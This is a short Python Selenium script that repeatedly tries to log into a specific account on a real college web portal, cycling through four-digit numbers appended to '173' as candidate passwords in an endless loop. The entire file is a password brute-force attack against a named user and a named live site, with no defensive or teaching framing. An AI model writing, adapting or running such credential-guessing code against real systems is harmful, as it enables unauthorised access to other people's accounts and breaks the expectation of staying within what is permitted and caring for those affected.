import time
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
chrome_path = r"C:\Users\Varun\Downloads\chromedriver_win32\chromedriver.exe"
driver = webdriver.Chrome(chrome_path)
def login(i):
    i=str(i)
    driver.get("https://portal.vjcet.ac.in/")
    #time.sleep(5)
    user = driver.find_element_by_css_selector('#txtUserName_txt')
    user.send_keys('pv13rr173')
    password = driver.find_element_by_css_selector('#txtPassword_txt')
    password.send_keys(i+'173')
    login = driver.find_element_by_css_selector('#btnLogin')
    s=login.click()
    WebDriverWait(driver,100).until(lambda  driver: driver.find_element_by_xpath('//*[@id="menu"]/div[2]/div/ul[2]/li/a'))


        #driver.save_screenshot("screenshot.png")
    return

while True:
    for i in range(1000,9999):
        login(i)
        print(i)
        #if s:
         #   time.sleep(19999999)



#time.sleep(100)



